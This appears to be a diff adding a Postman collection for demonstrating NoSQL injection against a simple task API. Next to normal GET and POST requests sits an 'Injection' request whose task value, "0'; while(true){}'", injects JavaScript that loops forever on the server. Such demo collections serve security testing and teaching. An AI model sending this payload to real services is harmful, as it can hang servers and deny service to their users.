@@ -1,0 +1,95 @@
+{
+	"variables": [],
+	"info": {
+		"name": "NoSQLInjection",
+		"_postman_id": "b7e2b21a-5fcc-3222-9eb1-2202b6b2eb99",
+		"description": "",
+		"schema": "https://schema.getpostman.com/json/collection/v2.0.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Normal get",
+			"request": {
+				"url": {
+					"raw": "{{domain}}/getTask?task=Eat",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"getTask"
+					],
+					"query": [
+						{
+							"key": "task",
+							"value": "Eat",
+							"equals": true,
+							"description": ""
+						}
+					],
+					"variable": []
+				},
+				"method": "GET",
+				"header": [],
+				"body": {},
+				"description": ""
+			},
+			"response": []
+		},
+		{
+			"name": "Injection",
+			"request": {
+				"url": {
+					"raw": "{{domain}}/getTask?task=0'; while(true){}'",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"getTask"
+					],
+					"query": [
+						{
+							"key": "task",
+							"value": "0'; while(true){}'",
+							"equals": true,
+							"description": ""
+						}
+					],
+					"variable": []
+				},
+				"method": "GET",
+				"header": [],
+				"body": {},
+				"description": ""
+			},
+			"response": []
+		},
+		{
+			"name": "Normal POST",
+			"request": {
+				"url": {
+					"raw": "{{domain}}/addTask?task=Eat",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"addTask"
+					],
+					"query": [
+						{
+							"key": "task",
+							"value": "Eat",
+							"equals": true,
+							"description": ""
+						}
+					],
+					"variable": []
+				},
+				"method": "POST",
+				"header": [],
+				"body": {},
+				"description": ""
+			},
+			"response": []
+		}
+	]
+}
